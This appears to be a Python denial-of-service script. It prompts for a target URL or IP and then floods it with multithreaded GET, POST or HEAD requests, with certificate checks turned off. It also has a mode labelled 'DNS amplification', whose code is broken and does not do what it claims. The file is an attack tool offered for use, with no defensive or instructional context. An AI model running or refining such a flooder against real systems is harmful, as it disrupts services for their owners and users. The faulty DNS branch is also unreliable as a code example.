import requests
import threading
import urllib3 
import dns.resolver  # Install dnspython library (pip install dnspython)
import dns.message
urllib3.disable_warnings()

# Function to send a GET request with SSL certificate verification disabled
def send_request(method, url, data=None):
    try:
        if method == 'GET':
            response = requests.get(url, verify=False)
        elif method == 'POST':
            response = requests.post(url, data=data, verify=False)
        elif method == 'HEAD':
            response = requests.head(url, verify=False)
        elif method == 'DNS':
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['<DNS_SERVER_IP>']  # Replace '<DNS_SERVER_IP>' with actual DNS server IP
            query = dns.message.make_query('example.com', dns.rdatatype.ANY)
            response = resolver.query(query)
            print(f"Response from DNS amplification: {response}")
            return  # No need to print status code for DNS amplification request

        print(f"Response from {url}: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error sending {method} request to {url}: {e}")

# Function to create and start threads
def send_requests_in_threads(method, url, num_requests, data=None):
    for _ in range(num_requests):
        t = threading.Thread(target=send_request, args=(method, url, data))
        t.start()

if __name__ == "__main__":
    # Get URL or IP address from user input
    url_or_ip = input("Enter the URL or IP address: ")

    # Send requests using multiple threads
    while True:
        method = input("Which method do you want to use? (GET, POST, HEAD, DNS): ").upper()
        if method not in ['GET', 'POST', 'HEAD', 'DNS']:
            print("Invalid method. Please enter GET, POST, HEAD, or DNS.")
            continue
        
        num_threads = int(input("Enter the number of threads (0 to exit): "))
        if num_threads == 0:
            break

        num_requests_per_thread = int(input("Enter the number of requests per thread: "))
        
        if method == 'POST':
            data = input("Enter the data to send: ")
        else:
            data = None
        
        for _ in range(num_threads):
            send_requests_in_threads(method, url_or_ip, num_requests_per_thread, data)

